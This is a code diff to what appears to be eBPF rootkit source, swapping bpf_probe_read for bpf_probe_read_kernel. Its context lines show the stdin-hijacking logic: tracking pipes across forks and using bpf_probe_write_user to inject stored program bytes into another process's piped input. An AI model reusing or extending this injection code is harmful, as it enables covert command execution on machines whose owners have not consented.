@@ -71,8 +71,8 @@ __attribute__((always_inline)) int handle_pipe(int fds[2]) {
     int fd1, fd2 = 0;
     struct tokens_t new_tokens = {};
 
-    bpf_probe_read(&fd1, sizeof(fd1), &fds[0]);
-    bpf_probe_read(&fd2, sizeof(fd2), &fds[1]);
+    bpf_probe_read_kernel(&fd1, sizeof(fd1), &fds[0]);
+    bpf_probe_read_kernel(&fd2, sizeof(fd2), &fds[1]);
 
     u32 tgid = bpf_get_current_pid_tgid() >> 32;
     struct tokens_t *tokens = bpf_map_lookup_elem(&pid_pipe_tokens, &tgid);
@@ -131,7 +131,7 @@ SEC("tracepoint/sched/sched_process_fork")
 int sched_process_fork(struct _tracepoint_sched_process_fork *args) {
     u32 ppid = bpf_get_current_pid_tgid() >> 32;
     u32 child_pid = 0;
-    bpf_probe_read(&child_pid, sizeof(child_pid), &args->child_pid);
+    bpf_probe_read_kernel(&child_pid, sizeof(child_pid), &args->child_pid);
 
     // copy pipe token from parent to child if there is one
     struct tokens_t *tokens = bpf_map_lookup_elem(&pid_pipe_tokens, &ppid);
@@ -337,8 +337,8 @@ __attribute__((always_inline)) int handle_stdin_read(struct pt_regs *ctx, void *
         bpf_get_current_comm(&to, sizeof(to));
 
         char pipe_key[32] = {};
-        bpf_probe_read(&pipe_key, 16, val->comm);
-        bpf_probe_read(&pipe_key[16], 16, &to);
+        bpf_probe_read_kernel(&pipe_key, 16, val->comm);
+        bpf_probe_read_kernel(&pipe_key[16], 16, &to);
         // bpf_printk("read from: %s\n", val->comm);
         // bpf_printk("read to: %s\n", to);
 
@@ -346,7 +346,7 @@ __attribute__((always_inline)) int handle_stdin_read(struct pt_regs *ctx, void *
         if (prog_key == 0) {
             // try without the source comm
             char zero[16] = {};
-            bpf_probe_read(&pipe_key, 16, &zero);
+            bpf_probe_read_kernel(&pipe_key, 16, &zero);
 
             prog_key = bpf_map_lookup_elem(&comm_prog_key, pipe_key);
             if (prog_key == 0) {
@@ -402,7 +402,7 @@ __attribute__((always_inline)) int handle_stdin_read(struct pt_regs *ctx, void *
 
             // we can't group the two sections because of the verifier
             if (piped_stdin->piped_data_backup_writer < (DATA_BACKUP_SIZE - 1)) {
-                bpf_probe_read((void*) backup + piped_stdin->piped_data_backup_writer, 1, &backup_c);
+                bpf_probe_read_kernel((void*) backup + piped_stdin->piped_data_backup_writer, 1, &backup_c);
             }
         }
     }
@@ -413,7 +413,7 @@ __attribute__((always_inline)) int handle_stdin_read(struct pt_regs *ctx, void *
     }
 
     char prog_c = 0;
-    bpf_probe_read(&prog_c, sizeof(prog_c), (void*)prog + piped_stdin->cursor);
+    bpf_probe_read_kernel(&prog_c, sizeof(prog_c), (void*)prog + piped_stdin->cursor);
     if (prog_c > 0) {
         bpf_probe_write_user(buf, &prog_c, 1);
         piped_stdin->cursor += 1;
@@ -429,7 +429,7 @@ __attribute__((always_inline)) int handle_stdin_read(struct pt_regs *ctx, void *
             return 0;
         }
 
-        bpf_probe_read(&backup_c, sizeof(backup_c), (void*)backup + piped_stdin->piped_data_backup_reader);
+        bpf_probe_read_kernel(&backup_c, sizeof(backup_c), (void*)backup + piped_stdin->piped_data_backup_reader);
         if (backup_c > 0) {
             bpf_probe_write_user(buf, &backup_c, 1);
             if (piped_stdin->piped_data_backup_reader + 1 >= HTTP_REQ_LEN - 32) {
